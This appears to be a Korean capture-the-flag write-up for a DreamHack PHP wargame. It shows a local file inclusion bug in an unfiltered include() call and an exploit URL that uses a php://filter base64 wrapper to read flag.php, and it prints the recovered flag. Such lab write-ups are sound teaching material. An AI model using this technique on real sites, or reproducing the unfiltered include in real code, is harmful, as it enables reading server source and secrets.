# [DreamHack] php-1

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> php로 작성된 Back Office 서비스입니다.
>
> LFI 취약점을 이용해 플래그를 획득하세요. 플래그는 `/var/www/uploads/flag.php`에 있습니다.
>
> Release: [php-1.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8569448/php-1.zip)

## Analysis

```php
      <?php
          include $_GET['page']?$_GET['page'].'.php':'main.php';
      ?>
```

`index.php`에서 임의의 `php` 파일을 `include`할 수 있는데, `page`에 전달되는 값이 필터링을 거치지 않아서 LFI 취약점이 발생한다. `/index.php?page=/var/www/uploads/flag`로 접속해서 `flag.php`를 `include`해보면 다음의 결과를 얻는다.

![image](https://user-images.githubusercontent.com/104156058/165457726-75fb9185-c15b-415b-a861-9ad60133be8a.png)

```html
    <div class="container">
      can you see $flag?    </div>
```

`Can you see $flag?`라는 문자열이 뜬다. `flag.php`에 플래그가 있다고는 했는데 출력되지는 않는다.

## Exploit

PHP wrapper를 이용해서 `flag.php` 파일의 내용을 읽어올 수 있다. `/index.php?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag`로 접속하면 뒤에 `.php`가 붙어서 `flag.php` 파일의 내용을 base64로 인코딩해서 출력하게 된다.

```html
    <div class="container">
      PD9waHAKCSRmbGFnID0gJ0RIe2JiOWRiMWYzMDNjYWNmMGYzYzkxZTBhYmNhMTIyMWZmfSc7Cj8+CmNhbiB5b3Ugc2VlICRmbGFnPw==    </div>
```

디코딩하면 플래그를 획득할 수 있다.

```php
<?php
	$flag = 'DH{bb9db1f303cacf0f3c91e0abca1221ff}';
?>
can you see $flag?
```